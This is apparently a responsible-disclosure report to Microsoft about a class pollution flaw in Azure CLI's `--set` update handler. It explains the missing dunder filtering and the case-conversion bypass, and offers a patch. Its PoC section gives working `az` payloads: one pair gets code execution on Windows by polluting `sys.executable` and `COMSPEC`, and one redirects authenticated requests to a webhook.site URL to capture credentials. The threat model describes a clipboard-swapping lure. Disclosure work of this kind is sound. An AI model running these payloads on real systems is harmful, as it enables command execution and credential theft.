title: Class Pollution Vulnerability found in Azure CLI that leads to RCE and Credential Leakage
Hello, Microsoft Security Team!

### Summary

We have found a class pollution vulnerability in the Azure CLI (https://github.com/Azure/azure-cli) which could allow attackers to overwrite global variables and class/function attributes across all Python modules at runtime. This vulnerability can lead to severe consequences, including arbitrary OS command execution and authorization credentials leakage through request hijacking.

### Details

**Backgrounds**

Class pollution (analogous to prototype pollution in JavaScript) is a relatively new vulnerability in Python. It occurs when an attacker can unexpectedly overwrite a module's global variables or the attributes of certain classes and functions at runtime. This issue is categorized under [CWE-915](https://cwe.mitre.org/data/definitions/915.html).

When exploited, class pollution allows attacker to manipulate the intended data-flow or control-flow of the application at runtime and lead to severe consequnces like DoS, RCE. For example, polluting a sensitive attribute like Flask’s `SECRET_KEY` can lead to authentication bypass, refer to [link](https://www.lanmaster53.com/2023/02/01/prototype-polution-in-flask/). 

For more information about class pollution please refer to:

[1] [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html) <br>
[2] [Report: Class Pollution leading to RCE in pydash](https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca) <br>
[3] [Blog: Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/) <br>
[4] [Blog: Class Pollution Gadgets in Jinja Leading to RCE](https://www.offensiveweb.com/docs/programming/python/class-pollution/) <br>


**Class Pollution Vulnerability found in Azure CLI**

Azure CLI provides users with the `update` command to set properties for various resources. For example, the command `az webapp update --ids X --set tags.a=b` updates the tags of the web app `X` by adding a key `a` with the value `b`. However, the `update` operation handler, implemented in the following `set_properties` function, does not properly sanitize or filter out "dunder" (double underscore) keys, such as `__globals__`. Therefore, the attackers can construct a specific key path that traverses from the instance object and pollute the sensitive variables/attributes across the global scopes. For instance, changing `tags.a=b` to `__class__.__init__.__globals__.__name__=polluted` would modify the `__name__` attribute of the module where the instance’s class is defined, e.g., the instance class of webapp `Site` has been defined at `azure/mgmt/web/v2023_01_01/models/_models_py3.py`.

Note that all `update` commands with the `--set` argument are vulnerable, as they share the same underlying code. In this report, we use `az webapp update` as an example to illustrate the issue.

```
// For the complete code: 
// https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L478-L524
def set_properties(instance, expression, force_string):
    key, value = _split_key_value_pair(expression)
    ...
    name, path = _get_name_path(key) # parse the key path
    ...
    instance = _find_property(instance, path) # traverse the key path and retrieve the destination object
    ...
    try:
        if index_value is not None:
            instance[index_value] = value # if destination object is an list
        elif isinstance(instance, dict):
            instance[name] = value  # if destination object is an dict
        ...
        else:
            # must be a property name
            if hasattr(instance, make_snake_case(name)):
                setattr(instance, make_snake_case(name), value)  # if destination object is an object
```

**To Pollute All the Loaded Modules**

To pollute all loaded modules within the current Python runtime, we exploit a specific attribute: the `modules` attribute of the `sys` module, which contains references to all loaded modules. Since the `azure/mgmt/web/v2023_01_01/models/_models_py3.py` module imports the `sys` module, it can be accessed through the path `__class__.__init__.__globals__.sys`. Using this path, we can obtain access to all modules loaded during runtime.

**Bypass Attribute Case Conversion**

Another noteworthy bypass is that when traversing the path, attribute names cannot contain uppercase letters, as class names like `WebAppsOperations` are converted to the snake-like `web_apps_operation`, shown in the following `_update_instance` function. However, this restriction applies only to object attributes but not to dictionary keys. To bypass this restriction, we use the `__dict__` attribute of an object which returns all the attributes of current object as a dictionary, thereby avoiding the case conversion. For instance, to access the `WebAppsOperations` class, we use the path `__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations`.

```
// For the complete code: 
// https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L658-L706
def _update_instance(instance, part, path):  # pylint: disable=too-many-return-statements, inconsistent-return-statements
    try:
        ...
        if isinstance(instance, dict):
            return instance[part]

        if hasattr(instance, make_snake_case(part)):
            return getattr(instance, make_snake_case(part), None)
        ...

def _find_property(instance, path):
    for part in path:
        instance = _update_instance(instance, part, path)
    return instance

snake_regex_1 = re.compile('(.)([A-Z][a-z]+)')
snake_regex_2 = re.compile('([a-z0-9])([A-Z])')


def make_snake_case(s):
    if isinstance(s, str):
        s1 = re.sub(snake_regex_1, r'\1_\2', s)
        return re.sub(snake_regex_2, r'\1_\2', s1).lower()
    return s
```

**Class Pollution Gadgets in Azure CLI**

To further escalate the impact of our class pollution, we identified a few "gadgets," which are existing code snippets that guide the polluted value flow to dangerous sinks. We now show two severe consequences by exploiting these gadgets: 1/ arbitrary OS command execution by polluting the `COMSPEC` environment variable on Windows, and 2/ authorization credential leakage through request hijacking by polluting the `metadata` attribute of the `WebAppsOperations` class’s `_create_or_update_initial` function.

In the first case, we leverage a known gadget in Python's standard library, specifically the `subprocess` module, as detailed in [this blog post](https://blog.abdulrah33m.com/prototype-pollution-in-python/#:~:text=subprocess.Popen%20on%20Windows). By polluting `os.environ.COMSPEC` with an arbitrary command through the class pollution vulnerability, any subsequent execution of `subprocess.Popen` or `subprocess.run` with `shell=True` will execute our polluted command. In Azure CLI, we identified several locations where these functions are used, including during extension installation (e.g., `az new_extension -h`, where `new_extension` can be replaced with any uninstalled extension name such as `blueprint`), CLI upgrades (i.e., `az upgrade`), and CLI exit (i.e., `Ctrl+C`).

```
// https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/extension/dynamic_install.py#L246
def _check_value_in_extensions(cli_ctx, parser, args, no_prompt):
  ...
  if run_after_extension_installed:
      import subprocess
      import platform
      exit_code = subprocess.call(args, shell=platform.system() == 'Windows')
```

In the second case, we identified that when the CLI interacts with the server, it uses the `url` specified in the `metadata` attribute of the `WebAppsOperations` class’s `_create_or_update_initial` method to construct the request. However, this attribute can be polluted by the attacker with its own domain. As a result, subsequent requests—including those containing the authorization header—can be redirected to the attacker’s server.

```
// azure/mgmt/web/v2023_01_01/operations/_web_apps_operations.py
def _create_or_update_initial(
    self, resource_group_name: str, name: str, site_envelope: Union[_models.Site, IO], **kwargs: Any
) -> _models.Site:
    ...

    request = build_create_or_update_request(
        resource_group_name=resource_group_name,
        ...
        template_url=self._create_or_update_initial.metadata["url"], # Can be polluted
        headers=_headers,
        params=_params,
    )
    request = _convert_request(request)
    request.url = self._client.format_url(request.url)

    _stream = False
    pipeline_response: PipelineResponse = self._client._pipeline.run(  # pylint: disable=protected-access
        request, stream=_stream, **kwargs
    )

    response = pipeline_response.http_response
    ...

_create_or_update_initial.metadata = {
    "url": "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}"
}
```

### PoC

**Case 1: Class Pollution to OS Execution - Gadget 1**

PoC video: https://drive.google.com/file/d/1x0jBLixYG-LH3GpvVS-RWXTWYvPvj4FD/view?usp=sharing

In the Windows environment:

1. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
2. Input the following payload to pollute the attributes. The calculator should be poped up directly.
```
az resource update --ids X --set "__class__.__init__.__globals__.sys.executable=calc"
```

**Case 2: Class Pollution to OS Execution - Gadget 2**

PoC video: https://drive.google.com/file/d/1R-ISsS4aPaY3SIjTK6H1DIYg0wdp9WA7/view?usp=sharing

In the Windows environment:

1. Open the Azure CLI in an interactive mode.
2. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
3. Input the following payload to pollute the attributes.
```
az resource update --ids X --set "__class__.__init__.__globals__.sys.modules.subprocess.os.environ._data.COMSPEC=cmd /c calc"
```
4. Input any of the commands or behaviors to trigger the command execution.
```
az blueprint -h
az upgrade
Ctrl+C
```

**Case 3: Class Pollution to Credential Leakage**

PoC video: https://drive.google.com/file/d/1BmCpBTV0PkSZYRFDDA38TVKfU5mt-wZf/view?usp=sharing

1. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
2. Input the following payload to pollute the attributes and listen to the attacker-controlled URL to hook the user request.
```
az webapp update --ids X --set __class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d
```

### Patch 

A possible patch for this vulnerability is to add an attribute filter in the `_find_property` function to prevent updating attributes with names starting with double underscores (`__`).

```
def _find_property(instance, path):
    for part in path:
        if not part.startswith("__") and not part.endswith("__"):
            instance = _update_instance(instance, part, path)
    return instance
```

### Threat Model and Impact

This vulnerability shares the same threat model as [CVE-2022-39327](https://github.com/Azure/azure-cli/security/advisories/GHSA-47xc-9rr2-q7p4), where Azure CLI user input is from an untrusted source. A common attack vector is copying commands from attacker-controlled websites. For instance, an attacker could host a webpage displaying a seemingly benign Azure CLI command while using JavaScript to replace the copied content with a malicious command targeting the user's clipboard. This attack could lead to OS command execution on Windows systems and credential leakage across all environments.

